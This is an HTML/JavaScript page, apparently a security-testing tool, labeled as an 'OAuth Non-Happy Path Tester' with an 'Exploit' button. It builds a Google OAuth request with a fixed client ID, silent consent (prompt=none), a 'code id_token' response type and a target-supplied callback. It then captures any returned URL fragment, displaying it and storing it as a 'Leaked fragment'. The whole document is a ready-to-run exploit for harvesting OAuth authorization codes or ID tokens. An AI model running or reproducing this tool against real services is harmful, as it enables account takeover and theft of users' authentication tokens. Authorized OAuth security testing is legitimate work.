<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OAuth Tester</title>
</head>
<body>

    <h3>OAuth Non-Happy Path Tester</h3>

    <label>Target callback URL:</label><br>
    <input type="text" id="target" size="80"
        placeholder="https://target.com/api/v1/oauth/google/callback/login">
    <br><br>

    <input type="button" value="Exploit" onclick="exploit()">

    <pre id="output"></pre>

    <script>
        function exploit() {
            const target = document.getElementById("target").value.trim();

            if (!target) {
                alert("Insert target callback URL");
                return;
            }

            const encodedRedirect = encodeURIComponent(target);

            const url = "https://accounts.google.com/o/oauth2/auth?" +
                "client_id=466680526474.apps.googleusercontent.com" +
                "&redirect_uri=" + encodedRedirect +
                "&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.profile%20https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email" +
                "&state=ATTACK" +
                "&response_type=code%20id_token" +
                "&prompt=none" +
                "&nonce=TEST123";

            window.open(url, "_blank", "width=500,height=600");
        }

        // Capture fragment if it ever comes back to YOUR page
        window.addEventListener('load', () => {
            const fragment = window.location.hash;

            if (fragment) {
                console.log("Leaked fragment:", fragment);

                document.getElementById("output").innerText =
                    "Leaked fragment:\n" + fragment;

                // Optional: persist locally
                localStorage.setItem("leak", fragment);
            }
        });
    </script>

</body>
</html>
